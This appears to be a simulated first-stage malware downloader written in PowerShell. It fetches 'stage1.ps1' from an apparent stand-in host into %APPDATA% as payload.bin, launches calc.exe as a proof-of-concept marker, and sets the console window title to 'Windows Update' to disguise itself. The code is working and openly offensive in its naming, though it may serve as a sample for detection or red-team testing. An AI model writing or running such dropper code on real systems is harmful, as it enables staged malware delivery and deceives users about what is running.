
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://adatum.com/stage1.ps1',
    [string]$OutputPath = "$env:APPDATA\payload.bin",
    [int]$StageTimeout = 88
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$FetchResult = Invoke-Stage1Download -SourceUrl $PayloadUrl -DestinationPath $OutputPath -TimeoutSec $StageTimeout
if ($FetchResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
